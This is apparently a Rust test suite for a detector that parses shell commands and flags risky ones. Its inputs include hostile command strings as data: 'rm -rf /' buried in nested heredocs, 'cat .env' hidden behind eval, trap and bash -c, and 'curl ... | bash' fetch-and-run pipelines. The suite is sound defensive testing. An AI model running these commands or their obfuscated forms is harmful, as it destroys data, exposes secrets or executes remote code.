use super::*;

/// A body inside a body would double at each level, so its readings stop in step with
/// the text. What the innermost body runs is still read.
#[test]
fn a_body_inside_a_body_reads_in_step_with_the_text() {
    let words = "a ".repeat(30_000);
    let text = format!(
        "bash <<A\n$(bash <<B\n$(bash <<C\n$(bash <<D\n$(bash <<F\nrm -rf /\n{words}\nF\n)\nD\n)\nC\n)\nB\n)\nA"
    );
    let shell = super::super::super::shell_text::read(&text);
    assert!(
        shell.code.len() <= 5 * text.len(),
        "{} of {}",
        shell.code.len(),
        text.len()
    );
    assert!(
        shell
            .stages
            .iter()
            .chain(&shell.inner_commands)
            .any(|stage| shell.code[stage.clone()].trim() == "rm -rf /")
    );
    // A short one is read both ways at each level.
    let text = "bash <<A\n$(bash <<B\nit's $(rm -rf /) it's\nB\n)\nA";
    let shell = super::super::super::shell_text::read(text);
    assert!(
        shell
            .stages
            .iter()
            .chain(&shell.inner_commands)
            .any(|stage| shell.code[stage.clone()].trim() == "rm -rf /")
    );
}

/// `eval` and a shell's `-c` read their script however the flag is spelled, and a
/// program whose body may run stays a command of its own.
#[test]
fn a_script_is_read_however_its_flag_is_spelled() {
    let reader = Reader::new();
    for (rule, command) in [
        ("secret.env.read", "bash \"-c\" 'cat .env'"),
        ("secret.env.read", "bash -c -- 'cat .env'"),
        ("secret.env.read", "$SHELL -c 'cat .env'"),
        ("secret.env.read", "${SHELL} -lc 'cat .env'"),
        ("secret.env.read", "eval 'cat .env'"),
        ("secret.env.read", "eval \"cat .env\""),
        ("secret.env.read", "eval cat .env"),
        ("secret.env.read", "trap 'cat .env' EXIT"),
        ("secret.env.read", "trap -- 'cat .env' EXIT"),
        ("secret.env.read", "command eval 'cat .env'"),
        (
            "network.download",
            "eval 'curl https://example.invalid/a -o a'",
        ),
        ("execution.shell", "echo \"$(bash <<E\nb\nE\n)\""),
        ("execution.shell", "x=$(bash <<E\nb\nE\n)"),
    ] {
        assert!(reader.rules(command).contains(rule), "{rule}: {command:?}");
    }
    // An argument named like one of these makes no script of the next word.
    for command in ["echo eval 'cat .env'", "grep trap 'cat .env'"] {
        assert!(
            !reader.rules(command).contains("network.download"),
            "{command:?}"
        );
    }
    assert!(
        !reader
            .rules("echo eval 'curl https://example.invalid/a -o a'")
            .contains("network.download")
    );
}

/// A command stays a stage however deep it sits, and a command holding another is
/// read on its own only so far, up to what it holds past that.
#[test]
fn a_command_is_a_stage_at_any_depth() {
    let reader = Reader::new();
    for depth in [1, 3, 8, 9, 12, 40, 200] {
        let open = "$(".repeat(depth);
        let close = ")".repeat(depth);
        let command = format!("{open}cat .env{close}");
        assert!(
            reader.rules(&command).contains("secret.env.read"),
            "{command:?}"
        );
        let open = "echo \"$(".repeat(depth);
        let close = ")\"".repeat(depth);
        let command = format!("{open}curl https://example.invalid/a | bash{close}");
        assert!(reader.rules(&command).contains(CHAIN), "{command:?}");
    }
    assert!(
        reader
            .rules("$($($($($($($($($($(cat .env $(true))))))))))))")
            .contains("secret.env.read")
    );
}

/// What is read further inside a command adds no bytes without limit: a command
/// holding another repeats it, so past the bound it reads only to what it holds.
#[test]
fn nested_commands_are_read_on_their_own_only_so_far() {
    let pad = "a ".repeat(32 * 1024);
    let text = format!("x=$(cat .env $(true $({pad})))");
    let shell = super::super::super::shell_text::read(&text);
    let inner: Vec<&str> = shell
        .inner_commands
        .iter()
        .map(|span| shell.code[span.clone()].trim())
        .collect();
    assert!(inner.iter().any(|stage| stage.starts_with("cat .env")));
    // Bytes read on their own stay in step with the text at every depth.
    for depth in [1, 3, 8, 64, 4096] {
        for pad in ["", pad.as_str()] {
            let text = format!("{}a {pad}{}", "$(a ".repeat(depth), ")".repeat(depth));
            let shell = super::super::super::shell_text::read(&text);
            let total: usize = shell.inner_commands.iter().map(|span| span.len()).sum();
            assert!(
                total <= 3 * text.len(),
                "{depth}: {total} of {}",
                text.len()
            );
        }
    }
    // Frames that open no command between them change nothing.
    let text = format!(
        "{}a{}",
        format!("$(a {}", "${".repeat(65)).repeat(320),
        format!("{})", "}".repeat(65)).repeat(320)
    );
    let shell = super::super::super::shell_text::read(&text);
    let total: usize = shell.inner_commands.iter().map(|span| span.len()).sum();
    assert!(total <= 3 * text.len(), "{total} of {}", text.len());
    // Past the bound a command keeps its own words, up to what it holds.
    let open = "$(cat .env ".repeat(4096);
    let text = format!("{open}a{}", ")".repeat(4096));
    let shell = super::super::super::shell_text::read(&text);
    assert!(
        shell
            .inner_commands
            .iter()
            .filter(|span| shell.code[(*span).clone()].trim_end() == "cat .env $(")
            .count()
            > 2048,
    );
}

/// Reading further inside a command stays near the cost of reading its words, and
/// the work on a pipeline of downloads grows with its length. A source's budget is
/// spent by what its calls cost, so crafted text must not be able to multiply that.
#[test]
fn reading_inside_a_command_stays_near_the_cost_of_its_words() {
    let reader = Reader::new();
    let words = "a ".repeat(1900);
    let flat = reader.work(&format!("rm -rf / {words}"));
    for shape in [
        format!("rm -rf /; {}{words}{}", "$(".repeat(8), ")".repeat(8)),
        format!("rm -rf /; {}{words}{}", "$(a ".repeat(8), ")".repeat(8)),
        format!(
            "rm -rf /; {}{words}{}",
            "echo \"$(".repeat(8),
            ")\"".repeat(8)
        ),
        format!("rm -rf /; {}{words}{}", "`".repeat(2), "`".repeat(2)),
        format!("rm -rf /; {}", "$(a $(b) ".repeat(200)),
    ] {
        let work = reader.work(&shape);
        assert!(work < flat * 2, "{work} against {flat}: {:?}", &shape[..40]);
    }
    // The same rules fire on both of these, so each pays for the same evidence.
    let shell = reader.work(&format!("rm -rf /; bash {words}"));
    let script = reader.work(&format!("rm -rf /; bash -c '{words}'"));
    assert!(script < shell * 2, "{script} against {shell}");
    let download = "curl https://example.invalid/a|";
    let (short, long) = (
        reader.work(&download.repeat(60)),
        reader.work(&download.repeat(120)),
    );
    assert!(long < short * 5 / 2, "{long} against {short}");
    let (short, long) = (
        reader.work(&format!("{download}{}", "a|".repeat(900))),
        reader.work(&format!("{download}{}", "a|".repeat(1800))),
    );
    assert!(long < short * 5 / 2, "{long} against {short}");
}
